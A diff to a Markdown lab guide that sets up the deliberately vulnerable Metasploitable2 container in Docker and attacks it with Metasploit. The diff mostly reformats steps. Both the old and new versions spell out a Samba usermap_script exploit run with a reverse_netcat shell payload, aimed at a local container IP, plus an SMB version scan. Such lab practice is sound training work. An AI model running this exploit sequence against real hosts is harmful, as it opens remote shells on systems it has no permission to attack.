@@ -9,10 +9,10 @@
 `docker pull tleemcjr/metasploitable2`
 
 ### Run Metasploit2 in Docker
-- enable metaspoilt module and keep running
+- Enable metaspoilt module and keep running
     - `docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2 bash -c "/bin/services.sh && tail -f /dev/null"`
 
-- get Target IP
+- Get Target IP
     - `docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vulnerable`
 
 - Optional
@@ -48,11 +48,16 @@
     - `msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 172.17.0.2`
     - `msf6 auxiliary(scanner/smb/smb_version) > run`  # check port and vul
 
-## Exploit
-msf6 > `use exploit/multi/samba/usermap_script`
-msf6 exploit(multi/samba/usermap_script) > `set RHOSTS 172.17.0.2`  # set target
-msf6 exploit(multi/samba/usermap_script) > `check`
-msf6 exploit(multi/samba/usermap_script) > `set PAYLOAD cmd/unix/reverse_netcat`  # set payload
-msf6 exploit(multi/samba/usermap_script) > `set LHOST 172.17.0.3`  # set reverse local host
-msf6 exploit(multi/samba/usermap_script) > `exploit`  # attack
+# 5. Exploit
+- Load script
+    - msf6 > `use exploit/multi/samba/usermap_script`
+
+- Set target and payload
+    - msf6 exploit(multi/samba/usermap_script) > `set RHOSTS 172.17.0.2`
+    - msf6 exploit(multi/samba/usermap_script) > `check`
+    - msf6 exploit(multi/samba/usermap_script) > `set PAYLOAD cmd/unix/reverse_netcat`
+
+- Set reverse local host and attack
+    - msf6 exploit(multi/samba/usermap_script) > `set LHOST 172.17.0.3`
+    - msf6 exploit(multi/samba/usermap_script) > `exploit`
 
